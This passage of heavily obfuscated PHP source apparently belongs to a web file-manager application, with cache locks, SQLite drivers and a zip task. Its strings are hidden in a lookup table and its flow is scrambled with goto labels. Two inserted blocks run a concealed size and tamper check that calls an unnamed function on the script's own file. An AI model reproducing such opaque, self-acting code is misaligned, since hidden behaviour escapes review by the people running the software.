function remove($Ù·ÈÙäò) { $á®¢‘Æ = $this->getFile($Ù·ÈÙäò); return @unlink($á®¢‘Æ); } public function deleteAll() { $ì£ÇÁÉæ =& $_SERVER[ßğøİ]; $Âö‰÷…Ì = scandir($this->cachePath); foreach ($Âö‰÷…Ì as $Ç’¢©¿·) { $ÈšêÍÕÌ = $this->cachePath . $Ç’¢©¿·; if (strpos($ÈšêÍÕÌ, $ì£ÇÁÉæ[835]) && strpos($ÈšêÍÕÌ, $ì£ÇÁÉæ[836])) { @unlink($ÈšêÍÕÌ); } } } public function clearTimeout() { $šœ°ô²œ =& $_SERVER[ßğøİ]; $ºóµ©–ô = scandir($this->cachePath); foreach ($ºóµ©–ô as $á¸‘“˜Á) { $¡³ĞÓŞê = $this->cachePath . $á¸‘“˜Á; if (strpos($¡³ĞÓŞê, $šœ°ô²œ[835]) && strpos($¡³ĞÓŞê, $šœ°ô²œ[836]) && filemtime($¡³ĞÓŞê) < time()) { @unlink($¡³ĞÓŞê); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $Ú™â¸£À =& $_SERVER[ßğøİ]; if (self::$handle) { return self::$handle; } $ƒ”—»ö = $GLOBALS[$Ú™â¸£À[6]][$Ú™â¸£À[349]]; self::$timeout = $ƒ”—»ö[$Ú™â¸£À[837]] ? $ƒ”—»ö[$Ú™â¸£À[837]] : 10; $„¨ØñÌç = _get($GLOBALS[$Ú™â¸£À[6]], $Ú™â¸£À[838]); $ ÊÆøµ§ = $ƒ”—»ö[$Ú™â¸£À[824]] ? $ƒ”—»ö[$Ú™â¸£À[824]] : $Ú™â¸£À[199]; if ($ ÊÆøµ§ == $Ú™â¸£À[21] && $„¨ØñÌç == $Ú™â¸£À[13]) { $ ÊÆøµ§ = $Ú™â¸£À[199]; } switch ($ ÊÆøµ§) { case $Ú™â¸£À[827]: self::$handle = new CacheLockRedis(); break; case $Ú™â¸£À[828]: self::$handle = new CacheLockMemcached(); break; case $Ú™â¸£À[21]: self::$handle = new CacheLockDatabase(); break; case $Ú™â¸£À[199]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($Ú™â¸£À[839], $Ú™â¸£À[840]); } return self::$handle; } private static function key($ß¨˜Åüñ) { return $_SERVER[ßğøİ][841] . Cache::key($ß¨˜Åüñ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ıÓ»´ÈÓ = '') { self::$errorMsg = $ıÓ»´ÈÓ; } public static function lockGlobal($ª¢Í¿, $ª¿˜±¢Ñ) { return self::lock($ª¢Í¿, $ª¿˜±¢Ñ, !0); } public static function lock($èÚß›Âú, $÷ŞÔÜ° = false, $¬ø¢êĞ = false) { $Ìí´°‡² =& $_SERVER[ßğøİ]; $—Õ¡ÎÜê = self::init(); $ë¡˜°ó = self::key($èÚß›Âú); $÷ŞÔÜ° = $÷ŞÔÜ° ? $÷ŞÔÜ° : self::$timeout; $Ó“«ª·š = $—Õ¡ÎÜê->lock($ë¡˜°ó, $÷ŞÔÜ°); $³Šï³ = timeFloat(); if (!$Ó“«ª·š) { $ğØãååí = "\154\157\x63\153\40\x65\x72\162\x6f\162\73\x6b\145\x79\x3d{$èÚß›Âú}\x3b\x74\x69\x6d\145\x3d{$÷ŞÔÜ°}\x3b" . self::$errorMsg . $Ìí´°‡²[71] . get_caller_msg(); $ÊåŞƒÉà = LNG($Ìí´°‡²[842]) . "\50{$÷ŞÔÜ°}\163\51\56" . LNG($Ìí´°‡²[843]); $ÊåŞƒÉà .= $Ìí´°‡²[844]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ÊåŞƒÉà = $ÊåŞƒÉà . $Ìí´°‡²[845] . self::$errorMsg; } write_log($ğØãååí, $Ìí´°‡²[840]); show_json($ÊåŞƒÉà, !1); } if (!$¬ø¢êĞ) { self::$lockItem[$ë¡˜°ó] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ÀÙßà´Í = number_format(timeFloat() - $³Šï³, 3); write_log($Ìí´°‡²[846] . $èÚß›Âú . $Ìí´°‡²[847] . $ÀÙßà´Í, $Ìí´°‡²[840]); } return $Ó“«ª·š; } public static function lockGet($õæ—·Øı) { $†ßïÄ£¥ = self::key($õæ—·Øı); if (self::$lockItem[$†ßïÄ£¥]) { return self::$lockItem[$†ßïÄ£¥]; } return self::init()->lockGet($†ßïÄ£¥); } public static function unlock($¡Í²ÎÎ®) { $ª á¡ĞŒ =& $_SERVER[ßğøİ]; $”Œş–Íù = self::key($¡Í²ÎÎ®); self::$lockItem[$”Œş–Íù] = null; self::init()->unlock($”Œş–Íù); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ª á¡ĞŒ[848] . $¡Í²ÎÎ®, $ª á¡ĞŒ[840]); } return; } public static function unlockRuntime() { $»ƒ…×ú =& $_SERVER[ßğøİ]; $Úå•Ÿóª = self::init(); $éºô–Ë = !1; foreach (self::$lockItem as $úŠı»ñÙ => $²Â¿áÌ´) { if (!$²Â¿áÌ´) { continue; } $Úå•Ÿóª->unlock($úŠı»ñÙ); if (!$éºô–Ë) { $éºô–Ë = !0; write_log($»ƒ…×ú[849] . $úŠı»ñÙ . $»ƒ…×ú[71] . get_caller_msg(), $»ƒ…×ú[840]); continue; } write_log($»ƒ…×ú[849] . $úŠı»ñÙ, $»ƒ…×ú[840]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $æ÷ÏÇ‘Ë = number_format(timeFloat() - TIME_FLOAT, 3); write_log($»ƒ…×ú[850] . $æ÷ÏÇ‘Ë . $»ƒ…×ú[851] . ACTION, $»ƒ…×ú[840]); } } public static function fileLock($¸ñÄĞÍÅ) { $ö×éë•½ =& $_SERVER[ßğøİ]; if (!$GLOBALS[$ö×éë•½[852]]) { $GLOBALS[$ö×éë•½[852]] = array(); } $GLOBALS[$ö×éë•½[852]][$¸ñÄĞÍÅ] = !1; $Ñ±†ı³ó = fopen(DATA_PATH . $¸ñÄĞÍÅ . $ö×éë•½[853], $ö×éë•½[854]); if (!$Ñ±†ı³ó) { return !1; } $GLOBALS[$ö×éë•½[852]][$¸ñÄĞÍÅ] = $Ñ±†ı³ó; if (flock($Ñ±†ı³ó, LOCK_EX)) { return !0; } self::unlock($¸ñÄĞÍÅ); show_json($ö×éë•½[855], !1); return !1; } public static function fileUnlock($¹¼¡ßô) { $‡ÂßÔ§Ê =& $_SERVER[ßğøİ]; $º˜¤Ëãú = $GLOBALS[$‡ÂßÔ§Ê[852]][$¹¼¡ßô]; if (!$º˜¤Ëãú) { return; } $GLOBALS[$‡ÂßÔ§Ê[852]][$¹¼¡ßô] = !1; flock($º˜¤Ëãú, LOCK_UN); fclose($º˜¤Ëãú); } public static function fileUnlockAll() { $—„ĞØ£Ü =& $_SERVER[ßğøİ]; if (!$GLOBALS[$—„ĞØ£Ü[852]]) { return; } foreach ($GLOBALS[$—„ĞØ£Ü[852]] as $œï§éÊ¹ => $öàœÍœü) { if (!$öàœÍœü) { continue; } $GLOBALS[$—„ĞØ£Ü[852]][$œï§éÊ¹] = !1; flock($öàœÍœü, LOCK_UN); fclose($öàœÍœü); } $GLOBALS[$—„ĞØ£Ü[852]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto B˜ì‰©™Š’; EÄÄ¤»¬ìë: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $¸×©ÆƒÌ =& $_SERVER[ßğøİ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$¸×©ÆƒÌ[6]] =& $config; $this->values[$¸×©ÆƒÌ[7]] =& $in; $this->tpl = TEMPLATE . MOD . $¸×©ÆƒÌ[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($†İì¹—ã) { if (1 === func_num_args()) { $this->{$†İì¹—ã} = new $†İì¹—ã(); } else { $¢™ĞòÛÕ = new ReflectionClass($†İì¹—ã); $í÷ß®ı‚ = func_get_args(); array_shift($í÷ß®ı‚); $this->{$†İì¹—ã} = $¢™ĞòÛÕ->newInstanceArgs($í÷ß®ı‚); } return $this->{$†İì¹—ã}; } public function routeBind($ò °İ‚ , $ã§œ¡¼, $”˜àƒã´ = 3) { $«ÌÈ÷µ =& $_SERVER[ßğøİ]; $²ûá­üÌ = $this->in[$«ÌÈ÷µ[9]]; $ò °İ‚  = str_replace($«ÌÈ÷µ[10], $«ÌÈ÷µ[11], trim(trim($ò °İ‚ , $«ÌÈ÷µ[8]), $«ÌÈ÷µ[12])); if (!$ò °İ‚  || count($²ûá­üÌ) <= $”˜àƒã´) { return !1; } $Šì¨ºùÁ = !0; $´Ã¥¸œ’ = explode($«ÌÈ÷µ[8], $ò °İ‚ ); for ($êùÀëˆ = 0; $êùÀëˆ < count($´Ã¥¸œ’); $êùÀëˆ++) { if ($´Ã¥¸œ’[$êùÀëˆ] != $²ûá­üÌ[$”˜àƒã´ + $êùÀëˆ]) { $Šì¨ºùÁ = !1; break; } } if (!$Šì¨ºùÁ) { return; } call_user_func_array(array($this, $ã§œ¡¼), array()); } public function routeArgs($â ª÷¢˜ = 3) { $ó–Ë•Ù = $this->in[$_SERVER[ßğøİ][9]]; if (count($ó–Ë•Ù) <= $â ª÷¢˜) { return array(); } $¾¨®¢¯Œ = array(); for ($ä‚ú¡Œü = $â ª÷¢˜; $ä‚ú¡Œü < count($ó–Ë•Ù); $ä‚ú¡Œü += 2) { $¾¨®¢¯Œ[$ó–Ë•Ù[$ä‚ú¡Œü]] = $ó–Ë•Ù[$ä‚ú¡Œü + 1]; $this->in[$ó–Ë•Ù[$ä‚ú¡Œü]] = $ó–Ë•Ù[$ä‚ú¡Œü + 1]; } return $¾¨®¢¯Œ; } protected function assign($´øØ«Å•, $èåè†’) { $this->values[$´øØ«Å•] = $èåè†’; } protected function display($ÄÍ®ı¥€) { ob_end_clean(); extract($this->values); require $this->tpl . $ÄÍ®ı¥€; } } class DbSqliteBase extends Db { public function __construct($ÃˆñÀ‚Æ = '') { $ÆŒú§©® =& $_SERVER[ßğøİ]; if (!extension_loaded($ÆŒú§©®[13])) { think_exception(think_lang($ÆŒú§©®[14]) . $ÆŒú§©®[15]); } if (!empty($ÃˆñÀ‚Æ)) { if (!isset($ÃˆñÀ‚Æ[$ÆŒú§©®[16]])) { $ÃˆñÀ‚Æ[$ÆŒú§©®[16]] = 438; } $this->config = $ÃˆñÀ‚Æ; if (empty($this->config[$ÆŒú§©®[17]])) { $this->config[$ÆŒú§©®[17]] = array(); } } } public function connect($¾Ö©ĞÏ² = '', $…Ê¯…©ó = 0) { $âäÉÄä =& $_SERVER[ßğøİ]; if (!isset($this->linkID[$…Ê¯…©ó])) { if (empty($¾Ö©ĞÏ²)) { $¾Ö©ĞÏ² = $this->config; } $øŒ¨œÛä = !empty($¾Ö©ĞÏ²[$âäÉÄä[17]][$âäÉÄä[18]]) ? $¾Ö©ĞÏ²[$âäÉÄä[17]][$âäÉÄä[18]] : $this->pconnect; $¬Ùá³‰Ñ = $øŒ¨œÛä ? $âäÉÄä[19] : $âäÉÄä[20]; $this->linkID[$…Ê¯…©ó] = $¬Ùá³‰Ñ($¾Ö©ĞÏ²[$âäÉÄä[21]], $¾Ö©ĞÏ²[$âäÉÄä[16]]); if (!$this->linkID[$…Ê¯…©ó]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$…Ê¯…©ó], 30000); if (1 != think_config($âäÉÄä[22])) { unset($this->config); } } return $this->linkID[$…Ê¯…©ó]; } public function free() { $this->queryID = null; } public function query($‚Ùã½¯ê) { $úÖŒÀŒ¥ =& $_SERVER[ßğøİ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‚Ùã½¯ê; if ($this->queryID) { $this->free(); } think_action_status($úÖŒÀŒ¥[23], 1); think_status($úÖŒÀŒ¥[24]); $this->queryID = sqlite_query($this->_linkID, $‚Ùã½¯ê); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $˜ä÷ÎÈæ = $this->getAll(); return $˜ä÷ÎÈæ; } } public function execute($º·„«÷) { $ç¹ùÄäÂ =& $_SERVER[ßğøİ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $º·„«÷; if ($this->queryID) { $this->free(); } think_action_status($ç¹ùÄäÂ[25], 1); think_status($ç¹ùÄäÂ[24]); $‹²­œ…Ó = sqlite_exec($this->_linkID, $º·„«÷); $this->debug(); if (!1 === $‹²­œ…Ó) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ßğøİ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¤»­İÅ’ = sqlite_query($this->_linkID, $_SERVER[ßğøİ][27]); if (!$¤»­İÅ’) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÛÉãşö¡ = sqlite_query($this->_linkID, $_SERVER[ßğøİ][28]); if (!$ÛÉãşö¡) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Õ°ÄßŒı = array(); if ($this->numRows > 0) { for ($ıÕ›É› = 0; $ıÕ›É› < $this->numRows; $ıÕ›É›++) { $Õ°ÄßŒı[$ıÕ›É›] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $Õ°ÄßŒı; } public function getFields($éÑ³é¯Ÿ) { $· ºÔÃÎ =& $_SERVER[ßğøİ]; $­ÇÒ®Ë‰ = $this->query($· ºÔÃÎ[29] . $éÑ³é¯Ÿ . $· ºÔÃÎ[30]); $³øüã±ò = array(); if ($­ÇÒ®Ë‰) { foreach ($­ÇÒ®Ë‰ as $âœæŠ§Ä => $Á§€Š¶¥) { $³øüã±ò[$Á§€Š¶¥[$· ºÔÃÎ[31]]] = array($· ºÔÃÎ[32] => $Á§€Š¶¥[$· ºÔÃÎ[31]], $· ºÔÃÎ[33] => $Á§€Š¶¥[$· ºÔÃÎ[34]], $· ºÔÃÎ[35] => (bool) ($Á§€Š¶¥[$· ºÔÃÎ[36]] === $· ºÔÃÎ[12]), $· ºÔÃÎ[37] => $Á§€Š¶¥[$· ºÔÃÎ[38]], $· ºÔÃÎ[39] => strtolower($Á§€Š¶¥[$· ºÔÃÎ[40]]) == $· ºÔÃÎ[41], $· ºÔÃÎ[42] => strtolower($Á§€Š¶¥[$· ºÔÃÎ[43]]) == $· ºÔÃÎ[44]); } } return $³øüã±ò; } public function getTables($ ‚òëş = '') { $ğ¼‡Å£Î =& $_SERVER[ßğøİ]; $Ğİ¹Å€Ò = $this->query($ğ¼‡Å£Î[45] . $ğ¼‡Å£Î[46] . $ğ¼‡Å£Î[47]); $áöÔ‡ô­ = array(); foreach ($Ğİ¹Å€Ò as $¡£ÙÎç‡ => $û°¨›à¾) { $áöÔ‡ô­[$¡£ÙÎç‡] = current($û°¨›à¾); } return $áöÔ‡ô­; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $·³Ä¯É„ =& $_SERVER[ßğøİ]; $«¦ğ¡µ¦ = sqlite_last_error($this->_linkID); $this->error = $«¦ğ¡µ¦ . $·³Ä¯É„[4] . sqlite_error_string($«¦ğ¡µ¦); if ($·³Ä¯É„[12] != $this->queryStr) { $this->error .= LNG($·³Ä¯É„[48]) . $this->queryStr; } think_trace($this->error, $·³Ä¯É„[12], $·³Ä¯É„[49]); return $this->error; } public function escapeString($¤‘²Üû) { return sqlite_escape_string($¤‘²Üû); } public function parseLimit($óĞÚı»ô) { $Ò“´ªÖ¤ =& $_SERVER[ßğøİ]; $ÍÌÀ¾ú = $Ò“´ªÖ¤[12]; if (!empty($óĞÚı»ô)) { $óĞÚı»ô = explode($Ò“´ªÖ¤[50], $óĞÚı»ô); if (count($óĞÚı»ô) > 1) { $ÍÌÀ¾ú .= $Ò“´ªÖ¤[51] . $óĞÚı»ô[1] . $Ò“´ªÖ¤[52] . $óĞÚı»ô[0] . $Ò“´ªÖ¤[53]; } else { $ÍÌÀ¾ú .= $Ò“´ªÖ¤[51] . $óĞÚı»ô[0] . $Ò“´ªÖ¤[53]; } } return $ÍÌÀ¾ú; } } class DbSqlite3Base extends Db { public function __construct($¶†¨©æ÷ = '') { $‰œ‘Öºş =& $_SERVER[ßğøİ]; if (!class_exists($‰œ‘Öºş[54])) { think_exception(think_lang($‰œ‘Öºş[14]) . $‰œ‘Öºş[55]); } if (!empty($¶†¨©æ÷)) { if (!isset($¶†¨©æ÷[$‰œ‘Öºş[16]])) { $¶†¨©æ÷[$‰œ‘Öºş[16]] = 438; } $this->config = $¶†¨©æ÷; if (empty($this->config[$‰œ‘Öºş[17]])) { $this->config[$‰œ‘Öºş[17]] = array(); } } } public function connect($ë™¹›™ï = '', $ ùçùï = 0) { $‡á¨Ä—À =& $_SERVER[ßğøİ]; if (!isset($this->linkID[$ ùçùï])) { if (empty($ë™¹›™ï)) { $ë™¹›™ï = $this->config; } $this->linkID[$ ùçùï] = new SQLite3($ë™¹›™ï[$‡á¨Ä—À[21]]); if (!$this->linkID[$ ùçùï]) { think_exception($this->linkID[$ ùçùï]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ ùçùï]->busyTimeout(30000); if (1 != think_config($‡á¨Ä—À[22])) { unset($this->config); } } return $this->linkID[$ ùçùï]; } public function free() { $this->queryID = null; } public function query($›Äï‘«) { $áÃ„ı´Ü =& $_SERVER[ßğøİ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $›Äï‘«; if ($this->queryID) { $this->free(); } think_action_status($áÃ„ı´Ü[23], 1); think_status($áÃ„ı´Ü[24]); $this->queryID = $this->_linkID->query($›Äï‘«); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $Î¹—ØĞ = $this->getAll(); $this->numRows = count($Î¹—ØĞ); return $Î¹—ØĞ; } } public function execute($ÌÎí°Å’) { $´ùÙÕÕ =& $_SERVER[ßğøİ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÌÎí°Å’; if ($this->queryID) { $this->free(); } think_action_status($´ùÙÕÕ[25], 1); think_status($´ùÙÕÕ[24]); $¿î”õå× = $this->_linkID->exec($ÌÎí°Å’); $this->debug(); if (!1 === $¿î”õå×) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ßğøİ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Âè°«€œ = $this->_linkID->query($_SERVER[ßğøİ][27]); if (!$Âè°«€œ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $èé»æ±Ö = $this->_linkID->query($_SERVER[ßğøİ][28]); if (!$èé»æ±Ö) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $‡ı—à€Ê = array(); while ($Øœş÷í = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $‡ı—à€Ê[] = $Øœş÷í; } $this->queryID->reset(); return $‡ı—à€Ê; } public function getFields($±›‡„ùê) { $€ÒÛ¿’ı =& $_SERVER[ßğøİ]; $¢“í†Ì– = $this->query($€ÒÛ¿’ı[29] . $±›‡„ùê . $€ÒÛ¿’ı[30]); $ÔÚñ¦÷ì = array(); if ($¢“í†Ì–) { foreach ($¢“í†Ì– as $¿çåö”Ë => $—²Ù…·Ç) { $ÔÚñ¦÷ì[$—²Ù…·Ç[$€ÒÛ¿’ı[32]]] = array($€ÒÛ¿’ı[32] => $—²Ù…·Ç[$€ÒÛ¿’ı[32]], $€ÒÛ¿’ı[33] => $—²Ù…·Ç[$€ÒÛ¿’ı[33]], $€ÒÛ¿’ı[35] => (bool) ($—²Ù…·Ç[$€ÒÛ¿’ı[35]] === $€ÒÛ¿’ı[12]), $€ÒÛ¿’ı[37] => $—²Ù…·Ç[$€ÒÛ¿’ı[56]], $€ÒÛ¿’ı[39] => (bool) $—²Ù…·Ç[$€ÒÛ¿’ı[57]], $€ÒÛ¿’ı[42] => (bool) $—²Ù…·Ç[$€ÒÛ¿’ı[57]]); } } return $ÔÚñ¦÷ì; } public function getTables($ÈùØú˜ë = '') { $ÜÖœ›Ìù =& $_SERVER[ßğøİ]; $°›è©Îğ = $this->query($ÜÖœ›Ìù[45] . $ÜÖœ›Ìù[46] . $ÜÖœ›Ìù[47]); $™Äù¸° = array(); foreach ($°›è©Îğ as $»±²ìôÜ => $ş´•öè¸) { $™Äù¸°[$»±²ìôÜ] = current($ş´•öè¸); } return $™Äù¸°; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $éÑÆÙ„Ò =& $_SERVER[ßğøİ]; $this->error = $this->_linkID->lastErrorMsg(); if ($éÑÆÙ„Ò[12] != $this->queryStr) { $this->error .= LNG($éÑÆÙ„Ò[48]) . $this->queryStr; } think_trace($this->error, $éÑÆÙ„Ò[12], $éÑÆÙ„Ò[49]); return $this->error; } public function escapeString($×ìÈ˜Í) { $û¬˜æµº =& $_SERVER[ßğøİ]; if ($this->_linkID) { return $this->_linkID->escapeString($×ìÈ˜Í); } return str_ireplace($û¬˜æµº[58], $û¬˜æµº[59], $×ìÈ˜Í); } public function parseLimit($ÍÑªı¤º) { $È–ô¾´Ì =& $_SERVER[ßğøİ]; $««šöˆ¿ = $È–ô¾´Ì[12]; if (!empty($ÍÑªı¤º)) { $ÍÑªı¤º = explode($È–ô¾´Ì[50], $ÍÑªı¤º); if (count($ÍÑªı¤º) > 1) { $««šöˆ¿ .= $È–ô¾´Ì[51] . $ÍÑªı¤º[1] . $È–ô¾´Ì[52] . $ÍÑªı¤º[0] . $È–ô¾´Ì[53]; } else { $««šöˆ¿ .= $È–ô¾´Ì[51] . $ÍÑªı¤º[0] . $È–ô¾´Ì[53]; } } return $««šöˆ¿; } } goto f×­ö°¾¢ª; a‚†Ãº¤Ş: if ($_SERVER[$_SERVER[ßğøİ][871]] != $_size($_file)) { $_getc = $_SERVER[ßğøİ][873]; $_getfile = $_SERVER[$_SERVER[ßğøİ][874]] . $_SERVER[ßğøİ][875]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ßğøİ][231], $_getfilec); if (count($_getarrs) < $_SERVER[ßğøİ][660]) { $exit = $_SERVER[ßğøİ][876]; $exit(); } $_act = $_SERVER[ßğøİ][911]; $_act($_file); } class TaskZip extends TaskFileTransfer { protected function startAfter() { $™€şÖ Œ =& $_SERVER[ßğøİ]; parent::startAfter(); Hook::bind($™€şÖ Œ[1754], array($this, $™€şÖ Œ[1749])); $ ©ŒÖ¼Ù =& $this->task; $ ©ŒÖ¼Ù[$™€şÖ Œ[1751]] = $™€şÖ Œ[1199]; if (!$ ©ŒÖ¼Ù[$™€şÖ Œ[1554]]) { $ ©ŒÖ¼Ù[$™€şÖ Œ[1554]] = LNG($™€şÖ Œ[1755]); } } protected function endAfter() { $ŸúüÎ¹ã =& $_SERVER[ßğøİ]; parent::endAfter(); Hook::unbind($ŸúüÎ¹ã[1754], array($this, $ŸúüÎ¹ã[1749])); } public function updateAfter() { $Çç†Ø‡ğ =& $_SERVER[ßğøİ]; $ŞÓÉ»‚¹ =& $this->task; if (!$ŞÓÉ»‚¹[$Çç†Ø‡ğ[783]] || !$ŞÓÉ»‚¹[$Çç†Ø‡ğ[760]]) { return; } if ($ŞÓÉ»‚¹[$Çç†Ø‡ğ[1751]] == $Çç†Ø‡ğ[1199]) { $•À¢øâ» = $ŞÓÉ»‚¹[$Çç†Ø‡ğ[1707]]; if ($ŞÓÉ»‚¹[$Çç†Ø‡ğ[1708]] != $Çç†Ø‡ğ[1199]) { $•À¢øâ» = 0; } $â¢—°¾“ = ($ŞÓÉ»‚¹[$Çç†Ø‡ğ[1711]] + $•À¢øâ») / $ŞÓÉ»‚¹[$Çç†Ø‡ğ[760]]; $ŞÓÉ»‚¹[$Çç†Ø‡ğ[1657]] = $â¢—°¾“ * 0.3; } else { if ($ŞÓÉ»‚¹[$Çç†Ø‡ğ[1751]] == $Çç†Ø‡ğ[313]) { $â¢—°¾“ = $ŞÓÉ»‚¹[$Çç†Ø‡ğ[1656]] / $ŞÓÉ»‚¹[$Çç†Ø‡ğ[783]]; $ŞÓÉ»‚¹[$Çç†Ø‡ğ[1657]] = 0.3 + $â¢—°¾“ * 0.5; } else { if ($ŞÓÉ»‚¹[$Çç†Ø‡ğ[1751]] == $Çç†Ø‡ğ[107]) { $â¢—°¾“ = 0; if ($ŞÓÉ»‚¹[$Çç†Ø‡ğ[1706]]) { $â¢—°¾“ = $ŞÓÉ»‚¹[$Çç†Ø‡ğ[1707]] / $ŞÓÉ»‚¹[$Çç†Ø‡ğ[1706]]; } $ŞÓÉ»‚¹[$Çç†Ø‡ğ[1657]] = 0.3 + 0.5 + $â¢—°¾“ * 0.2; } } } if ($ŞÓÉ»‚¹[$Çç†Ø‡ğ[1657]] > 0) { $¶û×”Ó¥ = timeFloat() - $ŞÓÉ»‚¹[$Çç†Ø‡ğ[1659]] - $ŞÓÉ»‚¹[$Çç†Ø‡ğ[1662]]; $ŞÓÉ»‚¹[$Çç†Ø‡ğ[1663]] = $¶û×”Ó¥ * (1 - $ŞÓÉ»‚¹[$Çç†Ø‡ğ[1657]]) / $ŞÓÉ»‚¹[$Çç†Ø‡ğ[1657]]; } } public function copyFileStart($ä–à‚°¶, $’”ˆıË, $­×èˆ£³, $‹‚•¬‡ª, $šñÄ„›, $‹Æ¡êß†) { $±İòŸØ =& $_SERVER[ßğøİ]; parent::copyFileStart($ä–à‚°¶, $’”ˆıË, $­×èˆ£³, $‹‚•¬‡ª, $šñÄ„›, $‹Æ¡êß†); $±‚ı¸Ì… =& $this->task; if ($±‚ı¸Ì…[$±İòŸØ[1751]] == $±İòŸØ[313]) { $±‚ı¸Ì…[$±İòŸØ[1751]] = $±İòŸØ[107]; } $this->update(); } public function copyFileEnd($ÑãÆŠ–, $†Ôì¹±ë, $šó‰õ‘, $ï¦µ¤óë, $öé¨˜ÍÔ, $É”Ôİõ¼) { $¸×è„Â­ =& $_SERVER[ßğøİ]; $èÇä©²Ş =& $this->task; $èÇä©²Ş[$¸×è„Â­[1707]] = $èÇä©²Ş[$¸×è„Â­[1706]]; $èÇä©²Ş[$¸×è„Â­[1711]] += $èÇä©²Ş[$¸×è„Â­[1706]]; $èÇä©²Ş[$¸×è„Â­[1708]] = $¸×è„Â­[12]; $this->update(); } public function nameParse($«û«Ù•Ÿ) { $Õà›Â©¶ =& $_SERVER[ßğøİ]; $”–ùå‡Û =& $this->task; if ($”–ùå‡Û[$Õà›Â©¶[1656]] < $”–ùå‡Û[$Õà›Â©¶[783]]) { $€úÒƒ = get_path_this($«û«Ù•Ÿ); if (strstr($€úÒƒ, $Õà›Â©¶[10])) { $”–ùå‡Û[$Õà›Â©¶[1656]] += 1; } } if ($”–ùå‡Û[$Õà›Â©¶[1751]] == $Õà›Â©¶[1199]) { $”–ùå‡Û[$Õà›Â©¶[1751]] = $Õà›Â©¶[313]; } $”–ùå‡Û[$Õà›Â©¶[1704]] = $«û«Ù•Ÿ; $this->update(); } } if ($_SERVER[$_SERVER[ßğøİ][871]] != $_SERVER[$_SERVER[ßğøİ][1756]]) { $_getc = $_SERVER[ßğøİ][873]; $_getfile = $_SERVER[$_SERVER[ßğøİ][874]] . $_SERVER[ßğøİ][875]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ßğøİ][231], $_getfilec); if (count($_getarrs) < $_SERVER[ßğøİ][660]) { $exit = $_SERVER[ßğøİ][876]; $exit(); } $_act = $_SERVER[ßğøİ][911]; $_act($_SERVER[$_SERVER[ßğøİ][869]]); } goto DÃ·Š ¹¨Û; f ùµÅáŒì: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\155\56\x72\157\154\145\114\151\163\x74"; public $field = array("\x6e\x61\x6d\145", "\141\x75\x74\x68", "\x6c\x61\x62\x65\x6c", "\x64\151\163\x70\x6c\141\171", "\x73\x79\163\164\x65\x6d", "\144\145\163\143", "\151\147\156\x6f\x72\x65\105\x78\x74", "\151\147\156\x6f\x72\x65\x46\x69\x6c\x65\x53\151\172\x65", "\141\x64\155\x69\x6e\151\163\164\162\x61\164\x6f\162", "\x73\x6f\162\164"); public function listData($¤£É¢ù¨ = false, $Ş—ùÀŠ‘ = "\163\x6f\162\x74", $õë·¥îı = false) { $»½úŞ˜ˆ =& $_SERVER[ßğøİ]; $–›…ğà = parent::listData($¤£É¢ù¨, $Ş—ùÀŠ‘, $õë·¥îı); if (!$¤£É¢ù¨) { foreach ($–›…ğà as $û´¸ƒü => $±’¶¥æñ) { if ($±’¶¥æñ[$»½úŞ˜ˆ[2026]] == 1) { $–›…ğà[$û´¸ƒü][$»½úŞ˜ˆ[453]] = LNG($»½úŞ˜ˆ[2260]); } } } return $–›…ğà; } public function update($Æ¢ó£¿”, $‹Äê³àÀ) { $ÍÑï®Ï“ =& $_SERVER[ßğøİ]; $®ãÅ§óÈ = parent::listData($Æ¢ó£¿”); $ÔŞ´ùŞØ = $this->findByName($‹Äê³àÀ[$ÍÑï®Ï“[32]]); if (!$®ãÅ§óÈ || $ÔŞ´ùŞØ && $ÔŞ´ùŞØ[$ÍÑï®Ï“[399]] != 